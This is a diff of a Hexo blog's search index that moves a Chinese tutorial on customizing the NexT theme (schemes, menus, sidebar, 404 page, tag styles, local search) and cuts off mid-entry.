-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment"># false，是否开启不蒜子统计功能</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">false</span>     <span class="comment"># true，是否开启总访客数统计   </span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">false</span>      <span class="comment"># true，是否开启总访问量统计</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span>      <span class="comment"># 是否开启文章阅读量统计</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/postview.png" alt="文章阅读量效果预览"></p>
-<h3 id="修改标签样式"><a href="#修改标签样式" class="headerlink" title="修改标签样式"></a>修改标签样式</h3><p>对于博客文章底部的标签样式默认为 <code>#tag</code> ，我们可以将其改成标签图标样式，打开模板 <code>themes/next/layout/_macro/post.swig</code> ，搜索 <code>rel=&quot;tag&quot;&gt;#</code> ，将 <code>#</code> 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code> 就可以了：</p>
-<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">    &#123;%- for tag in post.tags.toArray() %&#125;</span><br><span class="line">        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt; &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt; </span><br><span class="line">    &#123;%- endfor %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/label.png" alt="标签效果预览"></p>
-<h3 id="修改链接样式"><a href="#修改链接样式" class="headerlink" title="修改链接样式"></a>修改链接样式</h3><p>文章中的超链接样式也是可以通过文件来修改的，在 <code>themes/next/source/css/_common/components/post/post.styl</code> 文件末尾添加如下css样式：</p>
-<figure class="highlight styl"><figcaption><span>themes/next/source/css/_common/components/post/post.styl</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文章内链接文本样式</span></span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> a&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/link1.png" alt="链接效果预览"> <img src="/images/link2.png" alt="链接效果预览"></p>
-<h3 id="文章目录设置"><a href="#文章目录设置" class="headerlink" title="文章目录设置"></a>文章目录设置</h3><p>可以在 <span class="label success">主题配置文件</span> 中设置文章目录不自动生成并显示数字（可以自己添加）：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span>   <span class="comment"># true</span></span><br></pre></td></tr></table></figure>
-
-<div class="note info">
-            <p><i class="fa fa-info-circle"></i> 写文章时标题跨级否则取消自动生成数字标号后显示会错乱（一级标题后必须跟二级标题，二级标题后必须跟三级标题，以此类推）</p>
-          </div>
-
-<h3 id="添加文章结束标志"><a href="#添加文章结束标志" class="headerlink" title="添加文章结束标志"></a>添加文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
-<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/passage-end-tag.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;------------- &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; 本文结束感谢您的阅读 &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; -------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-<p>接着打开 <code>themes/next/layout/_macro/post.swig</code> 文件，在 <code>post-body</code> 之后( <code>END POST BODY</code> )， <code>post-footer</code> 之前添加如下代码：</p>
-<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后打开 <span class="label success">主题配置文件</span> 在末尾添加：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/thanksline.png" alt="结束标志效果预览"></p>
-<h3 id="添加文章版权信息"><a href="#添加文章版权信息" class="headerlink" title="添加文章版权信息"></a>添加文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>    <span class="comment"># true，侧边栏显示版权©️</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/copyright.png" alt="版权信息效果预览"></p>
-<h3 id="添加图片放大功能"><a href="#添加图片放大功能" class="headerlink" title="添加图片放大功能"></a>添加图片放大功能</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment"># false</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启本地搜索功能"><a href="#开启本地搜索功能" class="headerlink" title="开启本地搜索功能"></a>开启本地搜索功能</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
-<p><img src="/images/search.png" alt="本地搜索效果预览"><br>首先需要在根目录下执行以下命令来安装相关依赖：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
-
-<p>然后在 <span class="label success">主题配置文件</span> 中修改相关 <code>local_search</code> 字段：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># false</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>    <span class="comment"># 每次输入改变都执行搜索</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">3</span>    <span class="comment"># 1， 每篇文章显示的搜索结果数量，如果要显示所有结果可设置为-1</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
-
-<p>在 <span class="label warning">站点配置文件</span> 中添加以下字段：</p>
-<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># 指定搜索范围，可选 post | page | all</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 指定页面内容形式，可选 html | raw (Markdown) | excerpt | more</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>
-
-
-<hr>
-<h4> 参考链接 </h4>
-
-<ol>
-<li><a href="http://theme-next.iissnan.com/getting-started.html">NexT 使用文档</a></li>
-<li><a href="https://blog.csdn.net/nightmare_dimple/article/details/86661502?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control">Hexo 博客优化之Next 主题美化 - CSDN博客</a></li>
-<li><a href="https://blog.csdn.net/qq_39085060/article/details/103831291">Hexo next 主题博客搭建及美化 - CSDN博客</a></li>
-<li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇 - Yearito’s Blog</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Blog</tag>
       </tags>
   </entry>
   <entry>
@@ -603,8 +432,229 @@
       </categories>
       <tags>
         <tag>Hexo</tag>
-        <tag>Blog</tag>
         <tag>Markdown</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo博客搭建之NexT主题美化</title>
+    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+
+<h3 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h3><p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
+<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
+
+<p>到此，NexT 主题安装完成，下一步将验证主题是否正确启用。在切换主题之后、验证之前，最好使用 <code> hexo clean</code> 来清除 Hexo 的缓存。</p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
+<p><code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code></p>
+<p>此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。</p>
+<p>当站点的外观与下图所示类似时即说明已成功安装 NexT 主题。这是 NexT 默认的 Scheme —— Muse .</p>
+<p><img src="/images/next.jpg" alt="NexT 主题界面"></p>
+<h2 id="主题设定"><a href="#主题设定" class="headerlink" title="主题设定"></a>主题设定</h2><p>对于默认主题用起来有点不顺手，可以进行一些简单的设定改变主题的模样。</p>
+<h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>Scheme 是 NexT 提供的一种特性，借助于 Scheme，NexT 为你提供多种不同的外观。同时，几乎所有的配置都可以 在 Scheme 之间共用。目前 NexT 支持三种 Scheme，他们是：</p>
+<ul>
+<li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>
+<li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li>
+<li>Pisces - 双栏 Scheme，小家碧玉似的清新</li>
+<li>Gemini - Pisces 的改进版本，分块明确</li>
+</ul>
+<p>Scheme 的切换通过更改 <span class="label success">主题配置文件</span> ，搜索 <code>scheme</code> 关键字，将需用启用的 scheme 前面注释 <code>#</code> 去除即可。</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 将 <code>language</code> 设置成所需要的语言，例如选用简体中文，配置如下：</p>
+<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h3><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标，NexT 使用的是 FontAwesome 提供的图标。</p>
+<p>默认的 Next 主题样式中只包含首页和归档这两个链接，可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>menu</code> 字段来新增更多页面菜单。 其设置格式是 <code>item name: link || icon</code> ：<br>    - item name ：是一个名称，这个名称并不直接显示在页面上，用于匹配图标以及翻译<br>    - link ：菜单链接<br>    - icon ：表示所用的 <code>FontAwesome</code> 图标名称</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>
+
+<p>以上设置的菜单的名称并不直接用于界面上的展示，而是查找其对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/&#123;language&#125;.yml</code> 中（ <code>&#123;language&#125;</code> 为你所使用的语言）。</p>
+<p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code> 。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code> ，在 <code>menu</code> 字段下添加一项：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/languages/zh-Hans.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">公益404</span></span><br><span class="line">  <span class="attr">something:</span> <span class="string">有料</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置侧栏"><a href="#设置侧栏" class="headerlink" title="设置侧栏"></a>设置侧栏</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># position: left  # 靠左放置</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span>   <span class="comment"># 靠右放置</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure>
+
+<p>修改 <code>sidebar.display</code> 的值(只针对 Muse | Mist 主题)，支持的选项有：</p>
+<ul>
+<li>post - 默认行为，在文章页面（拥有目录列表）时显示</li>
+<li>always - 在所有页面中都显示</li>
+<li>hide - 在所有页面中都隐藏（可以手动展开）</li>
+<li>remove - 完全移除</li>
+</ul>
+<h3 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a>设置头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/xin.jpg</span>   <span class="comment"># 头像图片放置在themes/next/source/images目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span> <span class="comment"># 鼠标放在头像上时是否旋转</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>  <span class="comment"># 头像是否设为圆形，否则为矩形</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置作者昵称及站点描述"><a href="#设置作者昵称及站点描述" class="headerlink" title="设置作者昵称及站点描述"></a>设置作者昵称及站点描述</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 设置 <code>author</code> 为作者昵称，设置 <code>description</code> 字段为站点描述,可以是喜欢的一句签名:)</p>
+<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">xinkjung&#x27;s</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27; Be happy. &#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>安装好的默认主题是很简洁的，很多信息和配置都需要手动来进行修改。</p>
+<h3 id="添加标签-分类页面"><a href="#添加标签-分类页面" class="headerlink" title="添加标签/分类页面"></a>添加标签/分类页面</h3><span class="label default">标签</span> 页面将展示站点的所有标签，若你的所有文章都未包含标签，此页面将是空的。
+
+<span class="label default">分类</span> 页面将展示站点的所有分类，若你的所有文章都未包含分类，此页面将是空的。 
+
+<p>在终端窗口下，定位到 Hexo 站点目录下，新建一个页面，命名为 <code>tags</code> / <code>categories</code> ： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories </span><br></pre></td></tr></table></figure>
+
+<p>这时会发现 <code>source</code> 目录下出现了 <code>tags</code> 、 <code>categories</code> 两个文件夹，编辑文件夹内的 <code> index.md</code> 文件：</p>
+<figure class="highlight yml"><figcaption><span>source/tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><figcaption><span>source/categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
+
+<div class="note info">
+            <p><i class="fa fa-info-circle"></i> 这里要注意确保在主题配置文件的 menu 字段中添加了 tags 和 categories 页面</p>
+          </div>
+
+<h3 id="添加腾讯公益-404"><a href="#添加腾讯公益-404" class="headerlink" title="添加腾讯公益 404"></a>添加腾讯公益 404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><figcaption><span>source/404/index.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com/404/search_children.js&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">&quot;回到我的主页&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/data.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/page.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<div class="note info">
+            <p><i class="fa fa-info-circle"></i> 主题配置文件的 menu 字段中已经包含了 commonweal：/404/ ，直接在 menu 字段添加就可以了</p>
+          </div>
+
+<h3 id="添加-about-页面"><a href="#添加-about-页面" class="headerlink" title="添加 about 页面"></a>添加 about 页面</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><figcaption><span>source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">About</span> <span class="string">Me</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-07-30 18:45:37</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">xinkjung&#x27;s</span> <span class="string">blog!</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/menu.png" alt="菜单栏效果预览"></p>
+<h3 id="设置代码高亮-复制"><a href="#设置代码高亮-复制" class="headerlink" title="设置代码高亮/复制"></a>设置代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># 显示代码复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  <span class="comment"># 展示复制结果</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置侧边栏社交"><a href="#设置侧边栏社交" class="headerlink" title="设置侧边栏社交"></a>设置侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
+<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:xinkjung@163.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span 